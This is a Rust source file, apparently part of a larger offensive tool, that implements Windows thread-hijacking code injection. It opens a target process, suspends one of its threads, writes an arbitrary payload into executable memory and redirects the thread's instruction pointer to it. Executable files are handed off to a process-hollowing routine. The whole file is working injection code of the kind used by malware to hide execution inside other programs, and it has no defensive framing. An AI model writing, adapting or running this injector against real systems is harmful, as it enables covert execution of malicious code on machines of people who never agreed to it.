use anyhow::{anyhow, Result};
use crate::injection::Injector;

pub struct ThreadHijackInjector;

#[cfg(windows)]
impl Injector for ThreadHijackInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, GetThreadContext, SetThreadContext, ResumeThread, FlushInstructionCache};
        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, THREAD_SUSPEND_RESUME, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
        use winapi::um::winnt::{CONTEXT, CONTEXT_FULL};
        use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
        use winapi::shared::minwindef::FALSE;
        
        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            log::info!("PE payload detected, forwarding to process hollowing's inject_into_process");
            // Assuming hollowing module inject_into_process signature
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e))
            };
        }

        unsafe {
            let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, pid);
            if h_proc.is_null() { return Err(anyhow!("Failed to open process with correct permissions")); }

            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if snapshot == INVALID_HANDLE_VALUE { 
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to create toolhelp snapshot")); 
            }

            let mut te32: THREADENTRY32 = std::mem::zeroed();
            te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

            let mut target_tid = 0;
            if Thread32First(snapshot, &mut te32) != FALSE {
                loop {
                    if te32.th32OwnerProcessID == pid {
                        target_tid = te32.th32ThreadID;
                        break;
                    }
                    if Thread32Next(snapshot, &mut te32) == FALSE { break; }
                }
            }
            CloseHandle(snapshot);

            if target_tid == 0 { 
                CloseHandle(h_proc);
                return Err(anyhow!("No threads found in target process")); 
            }

            let h_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 0, target_tid);
            if h_thread.is_null() { 
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to open thread with required permissions")); 
            }

            if SuspendThread(h_thread) == u32::MAX {
                CloseHandle(h_thread);
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to suspend thread"));
            }

            let mut cleanup_and_err = |msg: &str| -> Result<()> {
                ResumeThread(h_thread);
                CloseHandle(h_thread);
                CloseHandle(h_proc);
                Err(anyhow!("{}", msg))
            };

            let mut ctx: CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FULL;
            
            if GetThreadContext(h_thread, &mut ctx) == FALSE {
                return cleanup_and_err("Failed to get thread context");
            }

            // In a real hijack with original context restoration, we'd write the context struct, 
            // a restore stub, and the payload itself. Since raw shellcode logic here is just to show structure:
            
            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if remote_mem.is_null() {
                return cleanup_and_err("Failed to allocate remote memory");
            }
            
            let mut written = 0;
            if WriteProcessMemory(h_proc, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == FALSE {
                return cleanup_and_err("Failed to write to remote process memory");
            }
            
            if FlushInstructionCache(h_proc, remote_mem, payload.len()) == FALSE {
                // Ignoring failure on flush is acceptable sometimes, but we requested comprehensive checks
                return cleanup_and_err("Failed to flush instruction cache");
            }

            #[cfg(target_arch = "x86_64")]
            { ctx.Rip = remote_mem as u64; }
            #[cfg(target_arch = "x86")]
            { ctx.Eip = remote_mem as u32; }

            if SetThreadContext(h_thread, &ctx) == FALSE {
                return cleanup_and_err("Failed to set modified thread context");
            }

            if ResumeThread(h_thread) == u32::MAX {
                // Not using cleanup_and_err because we are trying to resume
                CloseHandle(h_thread);
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to resume thread after setting context"));
            }

            CloseHandle(h_thread);
            CloseHandle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ThreadHijackInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Thread Hijacking only supported on Windows"))
    }
}
